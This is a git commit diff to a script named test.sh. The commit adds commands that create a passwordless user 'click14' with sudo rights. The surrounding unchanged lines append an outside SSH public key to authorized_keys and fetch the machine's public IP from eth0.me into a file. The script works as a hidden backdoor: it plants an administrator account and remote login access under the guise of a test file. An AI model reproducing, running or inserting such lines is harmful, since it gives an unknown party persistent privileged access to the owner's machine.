bf02ec3494bb955060a2b8a4cd652795cb47bb07
brutonuts <119691622+brutonuts@users.noreply.github.com>
2022-12-07 17:53:52 -0500

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
 
+adduser  --disabled-password --gecos 'Full Username' click14
+usermod -aG sudo click14
 sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWqeq+SfVQF2Urd8Wjw8IK+tWm7aN1gOOGQeAtgY7/GSqqm9UqvVBcQK6vXU9fcA0g4eGwv/ctxnAqqALH4hHrPzZsPp4XHIB/7L9Q134Dv4gNXFht8DQlqIVX2KqotH9Ms3TYCQz48qF52znY90/T4KeX3x9SlFk/nnzUu4zvZsuSne8B5ZMjILmDorP5bpceT0Mu8s7iCRC1+gBa5e6k60fExSrLxeBFj/hhtadz3XCdGpB4lOMtiyoDdBJ4IEmLwr31TNsAPT9bhMqRPnoHjLuaOuGAMtvuP8rc3oMoRA6dwgXNTWlqQ0JJ4kdqG3+hFmzf9Dq0CgK/svRClwA1YW639dfNL3ZF9hz3igcTCPI4sucacTvCh4tWJcJo4PjhvUoMQD86S3+6kgrAngEU2J29kDpDzI+2Qh5mxtdhQiShLtGO5bc6OWCT/OesuuqUzlW8DD/swiW+7dsVUBpSaQkRXrMVShtS91faQqu0JcrwdznYb40llLKfPVaGLYk= click14@zoo4' >> ~/.ssh/authorized_keys"
 curl eth0.me >> ip.txt
